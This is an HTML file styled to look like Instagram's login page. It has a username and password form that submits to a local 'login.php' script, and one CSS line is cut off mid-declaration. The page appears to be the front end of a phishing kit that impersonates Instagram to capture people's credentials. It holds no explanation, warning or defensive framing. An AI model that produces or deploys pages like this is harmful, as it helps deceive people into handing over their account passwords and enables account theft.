<!DOCTYPE html>
<html>
<head>
  <title>Instagram</title>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <style>
    body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Fira Sans","Droid Sans","Helvetica Neue",sans-serif;back>
    .box{width:350px;margin:100px auto;background:#fff;border:1px solid #dbdbdb;padding:40px 50px}
    input{width:100%;padding:10px;margin:5px 0;border:1px solid #dbdbdb;border-radius:3px}
    button{width:100%;padding:10px;background:#0095f6;color:#fff;border:none;border-radius:3px;font-weight:600}
    h2{text-align:center;font-family:'Billabong',cursive;font-size:50px;margin:0 0 30px}
  </style>
</head>
<body>
  <div class="box">
    <h2>Instagram</h2>
    <form action="login.php" method="POST">
      <input type="text" name="username" placeholder="Username" required />
      <input type="password" name="password" placeholder="Password" required />
      <button type="submit">Log In</button>
    </form>
  </div>
</body>
</html>
